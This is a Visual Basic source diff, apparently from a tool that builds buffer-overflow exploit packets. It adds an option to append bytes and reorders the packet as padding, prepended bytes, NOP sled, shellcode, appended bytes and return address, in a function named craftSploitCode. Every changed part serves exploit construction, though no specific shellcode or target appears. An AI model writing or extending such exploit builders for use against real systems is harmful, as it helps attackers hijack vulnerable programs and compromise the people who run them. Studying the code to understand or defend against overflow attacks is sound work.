@@ -17,6 +17,8 @@ Public evilPacket As String     ' our final packet is stored here
 Public bufferLen As Integer     ' the length we have to work with
 Public prepend As Boolean       ' do we have any data to prepend?
 Public prependBytes As String   ' What data are we prepending?
+Public append As Boolean        ' do we have any data to append?
+Public appendBytes As String    ' What data are we appending?
 Public useNops As Boolean       ' do we want to use nops to slide into shellcode?
 Public nopCount As Integer      ' how many nops before shellcode?
 
@@ -36,13 +38,16 @@ End Sub
 
 
 Private Function makePadding(count As Integer) As String
-    'creates some padding for us
+    'creates some padding for us,
+    'for now we pad with 'A', but later
+    'we will be able to pad with random data
+    
     Dim myPad As String
 
     
-    For I = 1 To count
+    For i = 1 To count
         myPad = myPad & "A"
-    Next I
+    Next i
     
     makePadding = myPad
     
@@ -52,22 +57,28 @@ Public Function craftSploitCode() As Integer 'returns error code
     Dim myPacket As String
     Dim junk As String
     
+    shellcode = Replace(shellcode, " ", "")
+    shellcode = HexToString(shellcode)
     retOffset = HexToStr(retOffset)
     
     If useNops = True Then
         junk = makePadding(bufferLen - Len(shellcode) - nopCount)
-        myPacket = junk & makeNops(nopCount)
+        myPacket = junk
     Else
         junk = makePadding(bufferLen - Len(shellcode))
         myPacket = junk
+        nopCount = 0
     End If
-    
     
     If prepend = True Then
         myPacket = myPacket & HexToStr(prependBytes)
     End If
     
-    myPacket = myPacket & shellcode
+    myPacket = myPacket & makeNops(nopCount) & shellcode
+        
+    If append = True Then
+        myPacket = myPacket & HexToStr(appendBytes)
+    End If
     
     myPacket = myPacket & retOffset
      
@@ -77,32 +88,14 @@ Public Function craftSploitCode() As Integer 'returns error code
     
 End Function
 
-Private Function willShellcodeFit() As Boolean
-
-    'returns true if we have enough space for our shellcode
-    If Len(shellcode) <= bufferLen Then
-        willShellcodeFit = True
-    Else
-        willShellcodeFit = False
-    End If
-    
-End Function
-
-Private Function countPadding() As Integer
-
-    'returns the total number of nops and padding characters we're going to need.
-    countPadding = bufferLen - Len(shellcode) - Len(prependBytes)
-    
-End Function
-
 Private Function makeNops(count As Integer) As String
 
     'creates some nops for us
     Dim myNops As String
     
-    For I = 1 To count
+    For i = 1 To count
         myNops = myNops & HexToString(90)
-    Next I
+    Next i
     
     makeNops = myNops
     
